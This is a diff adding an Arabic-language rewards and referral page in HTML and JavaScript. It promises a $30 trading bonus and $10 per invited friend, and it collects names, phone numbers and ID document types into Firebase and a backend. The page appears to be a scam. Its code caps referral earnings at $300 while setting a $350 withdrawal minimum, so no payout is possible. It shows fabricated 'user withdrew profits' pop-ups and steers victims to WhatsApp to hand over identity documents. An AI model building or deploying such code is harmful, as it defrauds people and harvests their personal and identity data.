@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="منصة المكافآت والتسجيل للتواصل مع فريق الدعم وشرح خطوات التسجيل.">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://mashaalmohammedseed-rgb.github.io/PromoSystem-livee/">
+    <meta property="og:locale" content="ar_AR">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="نظام المكافآت العالمي">
+    <meta property="og:description" content="سجّل بيانات التواصل وابدأ خطوات التفعيل مع فريق الدعم.">
+    <meta property="og:url" content="https://mashaalmohammedseed-rgb.github.io/PromoSystem-livee/">
+    <meta name="theme-color" content="#020617">
+    <link rel="alternate" hreflang="ar" href="https://mashaalmohammedseed-rgb.github.io/PromoSystem-livee/">
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebSite",
+      "name": "نظام المكافآت العالمي",
+      "inLanguage": "ar",
+      "url": "https://mashaalmohammedseed-rgb.github.io/PromoSystem-livee/",
+      "description": "منصة عربية للتسجيل والتواصل مع فريق الدعم وشرح خطوات التفعيل."
+    }
+    </script>
+    <title>منصة مكافآت عربية للتسجيل والتواصل | V15 PRO MAX</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
+
+    <style>
+        :root { --primary: #22c55e; --gold: #fbbf24; --bg: #020617; --card: rgba(15, 23, 42, 0.9); --border: rgba(51, 65, 85, 0.5); }
+        body { margin:0; font-family: 'Tajawal', sans-serif; background: var(--bg); color: #fff; background-image: radial-gradient(circle at top right, #1e293b 0%, #020617 60%); background-attachment: fixed; line-height: 1.6; padding-bottom: 100px; text-align: right; }
+        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
+        .glass-card { background: var(--card); backdrop-filter: blur(10px); border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .section-title { color: var(--primary); font-size: 1.3rem; font-weight: 900; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
+ 
+        #persistent-ref { display: none; background: linear-gradient(135deg, rgba(34, 197, 94, 0.15), rgba(2, 6, 23, 0.9)); border: 2px solid var(--primary); padding: 20px; border-radius: 20px; margin-bottom: 20px; }
+        .ref-display { background: #0f172a; padding: 12px; border-radius: 10px; border: 1px dashed var(--primary); margin: 10px 0; font-family: monospace; font-size: 0.9rem; color: var(--primary); word-break: break-all; text-align: center; }
+        
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
+        .stat-card { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; text-align: center; border: 1px solid var(--border); }
+        .stat-value { display: block; font-size: 1.5rem; font-weight: 900; color: var(--primary); }
+        .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+        .share-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
+        .share-btn { display: flex; flex-direction: column; align-items: center; padding: 10px; border-radius: 12px; font-size: 0.7rem; color: #fff; text-decoration: none; background: rgba(255,255,255,0.05); border: 1px solid var(--border); transition: 0.3s; }
+        .share-btn i { font-size: 1.4rem; margin-bottom: 5px; }
+        .share-btn:hover { background: var(--primary); transform: translateY(-2px); }
+
+        .info-box { background: rgba(255,255,255,0.03); border-radius: 12px; padding: 15px; margin-bottom: 15px; border-right: 4px solid var(--primary); }
+        .info-box.gold { border-right-color: var(--gold); }
+        .info-box h4 { margin: 0 0 8px 0; font-size: 1.1rem; color: #fff; }
+        .info-box p, .info-box li { margin: 0; font-size: 0.9rem; color: #94a3b8; list-style: none; padding: 2px 0; }
+
+        .form-group { margin-bottom: 15px; }
+        input, select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--border); background: #0f172a; color: #fff; font-family: 'Tajawal'; box-sizing: border-box; outline: none; }
+        .btn-main { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; font-weight: 900; cursor: pointer; }
+        
+        .social-btn { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 14px; border-radius: 12px; text-decoration: none; color: #fff; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
+        
+        #live-notify { position: fixed; bottom: 20px; left: 20px; background: var(--card); padding: 12px 20px; border-radius: 50px; border: 1px solid var(--primary); display: none; z-index: 9999; font-size: 0.85rem; font-weight: bold; animation: slideUp 0.5s; }
+        @keyframes slideUp { from { transform: translateY(50px); } to { transform: translateY(0); } }
+
+        .iti { width: 100%; }
+        .iti__country-list { background-color: #0f172a !important; color: white !important; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div style="text-align:center; padding: 20px 0;">
+        <h1 style="font-weight:900; margin:0; font-size: 1.8rem;">نظام المكافآت الذكي <span style="color:var(--primary)">V15</span></h1>
+        <p style="color:#94a3b8;">أكبر منصة مكافآت وتداول في الوطن العربي</p>
+    </div>
+
+    <div id="promo-section" style="display: none;" class="glass-card">
+        <div class="section-title" style="color: var(--gold);"><i class="fas fa-rocket"></i> طريقك لتحقيق أول 350$</div>
+        <p style="font-size: 1.1rem; color: #fff; font-weight: 700; margin-bottom: 8px;">اربح <span style="color: var(--primary); font-size: 1.4rem;">10$ نقدية</span> عن كل صديق!</p>
+        <p style="font-size: 0.85rem; color: #94a3b8; margin-bottom: 10px;">استخدم أزرار المشاركة بالأسفل لنشر رابطك تلقائياً في المجموعات والحالات بنقرة واحدة.</p>
+    </div>
+
+    <div id="persistent-ref" class="glass-card">
+        <div class="section-title"><i class="fas fa-wallet"></i> محفظة الإحالة الخاصة بك</div>
+        <p style="font-size: 0.9rem; margin-bottom: 10px;">مرحباً بك: <b id="user-display-name" style="color:var(--primary)">...</b></p>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <span class="stat-value" id="ref-count">0</span>
+                <span class="stat-label">صديق سجل عبرك</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-value" id="balance-value">0$</span>
+                <span class="stat-label">رصيدك الحالي</span>
+            </div>
+        </div>
+
+        <div class="ref-display" id="mainRefLink"></div>
+        
+        <div class="share-grid">
+            <a href="#" onclick="shareTo('whatsapp')" class="share-btn" style="color:#25D366"><i class="fab fa-whatsapp"></i> واتساب</a>
+            <a href="#" onclick="shareTo('telegram')" class="share-btn" style="color:#0088cc"><i class="fab fa-telegram-plane"></i> تيليجرام</a>
+            <a href="#" onclick="shareTo('facebook')" class="share-btn" style="color:#1877F2"><i class="fab fa-facebook"></i> فيسبوك</a>
+            <a href="#" onclick="shareTo('copy')" class="share-btn" style="color:var(--gold)"><i class="fas fa-copy"></i> نسخ الإعلان</a>
+            <a href="#" onclick="copyLinkOnly()" class="share-btn" style="color:#fff; grid-column: span 2;"><i class="fas fa-link"></i> نسخ الرابط</a>
+        </div>
+
+        <button class="btn-main" style="margin-top: 15px; background: linear-gradient(135deg, var(--gold), #d97706);" onclick="withdrawProfits()">💰 سحب الأرباح</button>
+    </div>
+
+    <div class="glass-card">
+        <div class="section-title"><i class="fas fa-gift"></i> تفاصيل بونص الـ 30$ للتداول</div>
+        <div class="info-box">
+            <h4>شروط الحصول على البونص:</h4>
+            <ul>
+                <li>• التسجيل بالاسم الكامل ورقم هاتف مفعل.</li>
+                <li>• إرفاق وثيقة الهوية (شخصية، جواز، أو رخصة).</li>
+                <li>• التواصل مع الإدارة عبر الواتساب لتفعيل المحفظة.</li>
+            </ul>
+        </div>
+        <div class="info-box">
+            <h4>الأرباح والسحب:</h4>
+            <p>يمكنك تحقيق أرباح من التداول تتراوح بين <b>70$ و 1000$</b>. يتم تقسيم صافي الأرباح بنسبة 50% للمتداول و 50% للمنصة.</p>
+        </div>
+    </div>
+
+    <div class="glass-card">
+        <div class="section-title" style="color:var(--gold)"><i class="fas fa-users-viewfinder"></i> برنامج الشركاء المطور</div>
+        <div class="info-box gold">
+            <h4>نظام المكافآت المباشرة:</h4>
+            <p>احصل على <b>10$ مكافأة نقدية</b> عن كل صديق يقوم بالتسجيل وإكمال بياناته عبر رابطك الخاص.</p>
+        </div>
+        <div class="info-box gold">
+            <h4>شروط السحب:</h4>
+            <p>أقل مبلغ مسموح بسحبه من محفظة الإحالات هو <b>350$</b>. يتم معالجة الطلبات خلال 24 ساعة عمل عبر الوسائل المتاحة.</p>
+        </div>
+    </div>
+
+    <div id="registration-section" class="glass-card">
+        <div class="section-title"><i class="fas fa-id-badge"></i> سجل الآن وابدأ بجني الأرباح</div>
+        <div class="form-group"><input type="text" id="name" autocomplete="name" aria-label="الاسم الكامل" placeholder="الاسم الكامل كما في الوثيقة"></div>
+        <div class="form-group"><input type="tel" id="phone" autocomplete="tel" aria-label="رقم الهاتف"></div>
+        <div class="form-group">
+            <select id="doc">
+                <option>البطاقة الشخصية</option>
+                <option>جواز السفر</option>
+                <option>رخصة قيادة</option>
+            </select>
+        </div>
+        <button class="btn-main" id="regBtn" onclick="register()">تفعيل حسابي واستلام الرابط ✅</button>
+    </div>
+
+    <div class="glass-card">
+        <div class="section-title"><i class="fas fa-headset"></i> مركز دعم التفعيل</div>
+        <p style="font-size: 0.8rem; color: var(--gold); margin-bottom: 10px;">يجب التواصل بعد التسجيل مباشرة لضمان حجز البونص.</p>
+        <div id="wa-btn" onclick="handleWhatsAppClick()" class="social-btn" style="background: #25D366;"><i class="fab fa-whatsapp"></i> تفعيل البونص (واتساب)</div>
+        <a href="https://t.me/A_VIP_B" class="social-btn" style="background: #0088cc;"><i class="fab fa-telegram-plane"></i> الدعم الفني (تيليجرام)</a>
+    </div>
+</div>
+
+<div id="live-notify"></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js";
+    import { getFirestore, doc, setDoc, getDoc, collection, query, where, onSnapshot } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-firestore.js";
+
+    // يُرسل الطلب إلى الخادم حتى لا يظهر سر تيليجرام في المتصفح.
+    const API_BASE_URL = window.location.hostname.endsWith("github.io")
+        ? "https://promosystem-ofn1.onrender.com"
+        : "";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDToWt5Eh47dVyI38zuAyX8yQURrQEOIJk",
+      authDomain: "bonus-system-f14df.firebaseapp.com",
+      projectId: "bonus-system-f14df",
+      storageBucket: "bonus-system-f14df.firebasestorage.app",
+      messagingSenderId: "1092561651955",
+      appId: "1:1092561651955:web:b683cd59ed03b450c80f86"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const iti = window.intlTelInput(document.querySelector("#phone"), {
+        separateDialCode: true, 
+        initialCountry: "ye",
+        excludeCountries: ["eg", "ma", "dz", "tn", "jo"],
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+    });
+
+    const systemSettings = {
+        inviteCount: 0,
+        currentBalance: 0, // متغير لتتبع الرصيد الحالي برمجياً
+        MIN_WITHDRAW: 350, // الحد الأدنى للسحب
+        SUPPORT_WA: "967739399064", // رقم الدعم
+        getRewardAmount: function() {
+            if (this.inviteCount >= 40) return 0;
+            if (this.inviteCount >= 20) return 5;
+            return 10;
+        }
+    };
+
+    window.register = async () => {
+        const nameInput = document.getElementById("name").value.trim();
+        const phone = iti.getNumber();
+        const docType = document.getElementById("doc").value;
+        const countryData = iti.getSelectedCountryData();
+
+        if(nameInput.length < 5 || !iti.isValidNumber()) return alert("يرجى إدخال بيانات صحيحة");
+        
+        const btn = document.getElementById("regBtn");
+        btn.disabled = true; btn.innerText = "...جاري الحفظ قم بالتواصل معنا من الاسفل عبر الوتسآب لتفعيل البونص";
+
+        const userUID = btoa(phone).replace(/=/g, "").substring(0, 12);
+        const urlParams = new URLSearchParams(window.location.search);
+        const refBy = urlParams.get('ref') || "Direct";
+
+        try {
+            await setDoc(doc(db, "users", userUID), {
+                name: nameInput, phone, docType,
+                myRefCode: userUID, referredBy: refBy, 
+                country: countryData.name, date: new Date().toISOString()
+            });
+
+            const response = await fetch(`${API_BASE_URL}/api/register`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    name: nameInput,
+                    phone,
+                    country: countryData.name,
+                    docType,
+                    inviterId: refBy === "Direct" ? "" : refBy
+                })
+            });
+            const result = await response.json().catch(() => ({}));
+            if (!response.ok) throw new Error(result.error || "Registration request failed");
+
+            localStorage.setItem("bonus_user_id", userUID);
+            location.reload();
+        } catch (e) {
+            console.error("Registration error:", e);
+            alert(e.message || "خطأ في الشبكة");
+            btn.disabled = false;
+            btn.innerText = "تفعيل حسابي واستلام الرابط ✅";
+        }
+    };
+
+    const init = async () => {
+        const savedID = localStorage.getItem("bonus_user_id");
+        if(savedID) {
+            try {
+                const userDoc = await getDoc(doc(db, "users", savedID));
+                if(userDoc.exists()) {
+                    const data = userDoc.data();
+                    document.getElementById("user-display-name").innerText = data.name;
+                    document.getElementById("mainRefLink").innerText = window.location.origin + window.location.pathname + "?ref=" + data.myRefCode;
+                    document.getElementById("persistent-ref").style.display = "block";
+                    document.getElementById("promo-section").style.display = "block"; // إظهار قسم التحفيز عند تسجيل الدخول
+                    document.getElementById("registration-section").style.display = "none";
+                    
+                    const q = query(collection(db, "users"), where("referredBy", "==", data.myRefCode));
+                    onSnapshot(q, (snapshot) => {
+                        const count = snapshot.size;
+                        systemSettings.inviteCount = count;
+                        document.getElementById("ref-count").innerText = count;
+                        
+                        let totalEarnings = 0;
+                        if (count <= 20) totalEarnings = count * 10;
+                        else if (count <= 40) totalEarnings = (20 * 10) + ((count - 20) * 5);
+                        else totalEarnings = (20 * 10) + (20 * 5);
+                        
+                        systemSettings.currentBalance = totalEarnings; // تحديث الرصيد في الكائن الرئيسي
+                        document.getElementById("balance-value").innerText = totalEarnings + "$";
+                    });
+                }
+            } catch(e) { console.log("Init Error:", e); }
+        }
+    };
+    init();
+
+    // دالة سحب الأرباح المضافة
+    window.withdrawProfits = () => {
+        const balance = systemSettings.currentBalance;
+        if (balance < systemSettings.MIN_WITHDRAW) {
+            alert(`❌ عذرًا، رصيدك الحالي (${balance}$) أقل من الحد الأدنى للسحب وهو ${systemSettings.MIN_WITHDRAW}$. حاول زيادته عبر دعوة المزيد من الأصدقاء.`);
+        } else {
+            const msg = `✅ مبروك! يمكنك الآن سحب أرباحك البالغة (${balance}$)\nيرجى التواصل مع الدعم عبر واتساب لإتمام عملية السحب وتزويدنا بتفاصيل محفظتك.`;
+            alert(msg);
+            window.open(`https://wa.me/${systemSettings.SUPPORT_WA}?text=${encodeURIComponent("أهلاً إدارة النظام، لقد وصلت للحد الأدنى للسحب برصيد " + balance + "$ وأريد سحب أرباحي.")}`, '_blank');
+        }
+    };
+
+    window.shareTo = (platform) => {
+        const link = document.getElementById("mainRefLink").innerText;
+        const text = `💰 سجل الآن واحصل على بونص تداول 30$ مجاناً! أرباح تصل لـ 1000$ بدون إيداع. استخدم رابطي:\n🔗 ${link}`;
+        if(platform === 'whatsapp') window.open(`https://wa.me/?text=${encodeURIComponent(text)}`);
+        else if(platform === 'telegram') window.open(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`);
+        else if(platform === 'facebook') window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(link)}`);
+        else if(platform === 'copy') { navigator.clipboard.writeText(text); alert("تم نسخ النص الترويجي!"); }
+    };
+
+    window.copyLinkOnly = () => {
+        navigator.clipboard.writeText(document.getElementById("mainRefLink").innerText);
+        alert("تم نسخ الرابط!");
+    };
+
+    window.handleWhatsAppClick = () => {
+        const isRegistered = document.getElementById("registration-section").style.display === "none";
+        let msg = "";
+
+        if (isRegistered) {
+            const name = document.getElementById("user-display-name").innerText;
+            const refLink = document.getElementById("mainRefLink").innerText;
+            const docType = document.getElementById("doc").value;
+            const phone = iti.getNumber();
+            const country = iti.getSelectedCountryData().name;
+
+            msg = `أهلاً إدارة نظام المكافآت،\nلقد أتممت التسجيل ببياناتي:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🌍 الدولة: ${country}\n📄 الوثيقة: ${docType}\n🔗 رابط إحالتي: ${refLink}\n\nأريد معرفة كيف أكمل التسجيل والحصول على بونص 30$`;
+        } else {
+            msg = `مرحباً إدارة المكافآت،\nدخلت للموقع وأريد الاستفسار عن كيفية الحصول على بونص 30$ ونظام الإحالة. ما هي الخطوات؟`;
+        }
+        
+        window.open(`https://wa.me/${systemSettings.SUPPORT_WA}?text=${encodeURIComponent(msg)}`, '_blank');
+    };
+
+    setInterval(() => {
+        const n = document.getElementById("live-notify");
+        n.innerHTML = `<i class="fas fa-check-circle" style="color:var(--primary)"></i> مستخدم جديد سحب حصته من الأرباح بنجاح!`;
+        n.style.display = "block";
+        setTimeout(() => n.style.display = "none", 4000);
+    }, 18000);
+</script>
+</body>
+            </html>
